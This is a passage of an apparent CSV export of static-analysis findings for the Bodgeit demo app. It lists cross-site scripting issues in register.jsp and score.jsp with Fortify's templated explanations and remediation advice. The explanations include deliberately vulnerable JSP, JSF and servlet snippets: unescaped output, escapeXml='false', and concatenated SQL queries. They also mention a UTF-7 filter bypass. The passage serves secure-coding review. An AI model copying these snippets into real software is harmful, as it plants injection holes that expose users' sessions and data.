could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","235","Cross-Site Scripting: Reflected","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/register.jsp","cookie","","http://localhost/root/register.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP request, then checks the value for this key in bundle. If the key doesn't exist, the default functionality is to print the key to the user. <pre> &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee ID: &lt;fmt:message key=""${param.eid}"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> </Paragraph></IfDef> The code in this example operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet's response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and looks up the corresponding employee's name in a bundle via the <code>key</code> attribute within the <code>&lt;fmt:message/&gt;</code> tag. If the key does not exist, the value passed to <code>key</code> gets printed to the page. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee Name: &lt;fmt:message key=""&lt;%= name %&gt;"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""/&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","213","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA,Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/score.jsp","","","http://localhost/root/score.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE 